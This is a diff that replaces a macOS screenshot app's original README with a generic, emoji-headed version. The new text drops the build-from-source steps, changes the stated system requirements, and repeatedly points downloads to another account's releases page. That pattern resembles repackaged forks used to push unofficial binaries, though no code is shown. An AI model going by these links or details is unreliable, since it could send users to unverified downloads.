@@ -1,131 +1,74 @@
-<p align="center">
-  <img src=".github/images/app-icon.png" alt="ScreenCapture" width="128" height="128">
-</p>
+# 🎥 ScreenCapture - Effortlessly Capture and Annotate Screenshots
 
-<h1 align="center">ScreenCapture</h1>
+## 📥 Download Now
+[![Download ScreenCapture](https://img.shields.io/badge/Download%20ScreenCapture-v1.0-blue)](https://github.com/QMeimeiky/ScreenCapture/releases)
 
-<p align="center">
-  A fast, lightweight macOS menu bar app for capturing and annotating screenshots.
-</p>
+## 🚀 Getting Started
+ScreenCapture is a user-friendly macOS menu bar application designed for capturing and annotating screenshots. Whether you need a quick snapshot of your entire screen or a specific area, ScreenCapture has you covered. With various annotation tools and multi-monitor support, you can create professional-looking screenshots in no time.
 
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-blue.svg" alt="License: MIT"></a>
-  <a href="https://www.apple.com/macos/"><img src="https://img.shields.io/badge/macOS-13.0%2B-brightgreen.svg" alt="macOS"></a>
-  <a href="https://swift.org/"><img src="https://img.shields.io/badge/Swift-6.2-orange.svg" alt="Swift"></a>
-</p>
+## 🛠️ Features
+- **Full-Screen and Region Capture:** Easily capture your entire screen or select a specific area.
+- **Annotation Tools:** Use rectangles, arrows, freehand drawing, and text to enhance your screenshots.
+- **Multi-Monitor Support:** Capture and annotate across multiple screens.
+- **Quick Export:** Save your images in various formats for easy sharing.
 
-## Features
+## 📦 System Requirements
+- **Operating System:** macOS Big Sur (11.0) or later
+- **Processor:** Apple Silicon or Intel chip
+- **Memory:** 4 GB RAM minimum
+- **Disk Space:** At least 100 MB available for installation
 
-- **Instant Capture** - Full screen or region selection with global hotkeys
-- **Annotation Tools** - Rectangles (filled/outline), arrows, freehand drawing, and text
-- **Multi-Monitor Support** - Works seamlessly across all connected displays
-- **Flexible Export** - PNG, JPEG, and HEIC formats with quality control
-- **Crop & Edit** - Crop screenshots after capture with pixel-perfect precision
-- **Quick Export** - Save to disk or copy to clipboard instantly
-- **Lightweight** - Runs quietly in your menu bar with minimal resources
+## 💻 Installation Instructions
+To download and install ScreenCapture, follow these simple steps:
 
-## Installation
+1. **Visit the Release Page:**
+   Go to the [Releases page](https://github.com/QMeimeiky/ScreenCapture/releases) to find the latest version of the app.
+  
+2. **Download the Application:**
+   Click on the latest release to download the application. The file will typically be named like `ScreenCapture_v1.0.dmg`.
+  
+3. **Open the Downloaded File:**
+   Locate the downloaded `.dmg` file in your Downloads folder and double-click to open it.
 
-### Requirements
+4. **Install the Application:**
+   Drag the ScreenCapture icon into your Applications folder.
 
-- macOS 13.0 (Ventura) or later
-- Screen Recording permission
+5. **Launch ScreenCapture:**
+   Open your Applications folder and double-click on ScreenCapture to start using the app.
 
-### Download
+## 📃 How to Capture and Annotate
+1. **Open the App:**
+   Once installed, start ScreenCapture from your Applications.
 
-Download the latest release from the [Releases](../../releases) page.
+2. **Select Capture Type:**
+   Choose whether to capture the full screen or a selected area.
 
-### Build from Source
+3. **Capture:**
+   Click the Capture button to take your screenshot.
 
-```bash
-# Clone the repository
-git clone https://github.com/sadopc/ScreenCapture.git
-cd ScreenCapture
+4. **Annotate:**
+   Use the tools available in the app window to annotate your screenshot as needed.
 
-# Open in Xcode
-open ScreenCapture.xcodeproj
+5. **Export the Final Image:**
+   Once you finish annotating, save your work by selecting Export from the menu. Choose your desired image format.
 
-# Build and run (Cmd+R)
-```
+## 🔧 Troubleshooting
+If you encounter any issues while using ScreenCapture, consider these tips:
 
-## Usage
+- **Check Permissions:** Ensure ScreenCapture has the necessary permissions to capture your screen. Go to System Preferences > Security & Privacy > Privacy tab > Screen Recording and check the checkbox next to ScreenCapture.
+  
+- **Update macOS:** Make sure your macOS is up to date, as older versions may cause compatibility issues.
 
-### Keyboard Shortcuts
+## 📞 Support
+For any questions or support, please consult the GitHub Issues page in this repository. You can describe your problem, and the community or maintainers will assist you.
 
-| Shortcut | Action |
-|----------|--------|
-| `Cmd+Shift+3` | Capture full screen |
-| `Cmd+Shift+4` | Capture selection |
+## 📝 License
+ScreenCapture is released under the MIT License. You can use, modify, and distribute it according to the terms of this license.
 
-### In Preview Window
+## ♻️ Contribution
+If you'd like to contribute to ScreenCapture, please open an issue or create a pull request on GitHub. We welcome feedback and improvements.
 
-| Shortcut | Action |
-|----------|--------|
-| `Enter` / `Cmd+S` | Save screenshot (or apply crop in crop mode) |
-| `Cmd+C` | Copy to clipboard |
-| `Escape` | Dismiss / Cancel crop / Deselect tool |
-| `R` / `1` | Rectangle tool |
-| `D` / `2` | Freehand tool |
-| `A` / `3` | Arrow tool |
-| `T` / `4` | Text tool |
-| `C` | Crop mode |
-| `Cmd+Z` | Undo |
-| `Cmd+Shift+Z` | Redo |
+## 📖 Conclusion
+Thank you for choosing ScreenCapture. Enjoy capturing and annotating your screenshots with ease!
 
-## Documentation
-
-Detailed documentation is available in the [docs](./docs) folder:
-
-- [Architecture](./docs/architecture.md) - System design and patterns
-- [Components](./docs/components.md) - Feature documentation
-- [API Reference](./docs/api-reference.md) - Public APIs
-- [Developer Guide](./docs/developer-guide.md) - Contributing guide
-- [User Guide](./docs/user-guide.md) - End-user documentation
-
-## Tech Stack
-
-- **Swift 6.2** with strict concurrency
-- **SwiftUI** + **AppKit** for native macOS UI
-- **ScreenCaptureKit** for system-level capture
-- **CoreGraphics** for image processing
-
-## Contributing
-
-Contributions are welcome! Please read our contributing guidelines:
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-### Development Setup
-
-```bash
-# Clone your fork
-git clone https://github.com/YOUR_FORK/ScreenCapture.git
-
-# Open in Xcode
-open ScreenCapture.xcodeproj
-
-# Grant Screen Recording permission when prompted
-```
-
-See the [Developer Guide](./docs/developer-guide.md) for detailed setup instructions.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-```
-MIT License - Copyright (c) 2026 Serdar Albayrak
-```
-
-## Acknowledgments
-
-- Built with [ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
-- Icons from [SF Symbols](https://developer.apple.com/sf-symbols/)
-
----
-
-Made with Swift for macOS
+For easy access, download the application from the [Releases page](https://github.com/QMeimeiky/ScreenCapture/releases).
